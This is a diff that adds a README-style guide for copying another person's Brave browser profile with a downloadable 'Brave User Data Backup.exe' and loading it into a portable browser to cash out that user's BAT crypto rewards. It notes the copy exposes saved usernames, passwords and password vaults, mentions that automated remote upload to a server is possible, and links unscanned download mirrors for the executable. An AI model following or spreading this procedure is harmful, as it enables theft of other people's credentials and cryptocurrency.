@@ -1,0 +1,30 @@
+Go to the user computer that has Brave Browser installed.
+1 - Make sure you close all Brave windows.
+2 - Execute my "Brave User Data Backup.exe" and let compress the User Data.
+3 - Copy BraveBackup.rar from the desktop to your storage device.
+
+On your computer
+1 - Execute and extract brave portable "brave-portable-win64-1.25.68-74-setup.exe".
+2 - Open BraveBackup.rar with winrar.
+3 - Navigate to Users > Your Profile Name > AppData > Local > BraveSoftware > Brave-Browser.
+4 - Extract the folder User Data to your desktop.
+5 - Rename the folder to data and copy to your Brave Browser Portable folder (next to brave-portable.exe).
+6 - Open brave-portable.exe and configure your wallet to cash out.
+
+Notes:
+- A more easy way to claim BAT from other Brave Browser users is by donating to a domain that you control.
+- Is possible to automate, remotely backup and upload the compressed file to a server but not included here.
+- It's possible to view bookmarks and other settings like domain, usernames, passwords, password vaults and extensions.
+- I never cash out using this method but i was able to transfer my earnings from Official Brave to Portable Brave.
+
+Download 1:
+http://j.gs/19214853/brave-user-data-backup
+http://bc.vc/PNP1ByP
+
+Download 2:
+https://filecrypt.cc/Container/53FE6438D9.html
+https://oxy.name/d/Mpse
+https://nitro.download/view/8D80001EF0BBDF1/Brave_User_Data_Backup_%2B_Portable.rar
+
+Virustotal:
+Didn't scan to avoid sharing the files but should have a few false positives. Use on a vmware or sandbox.
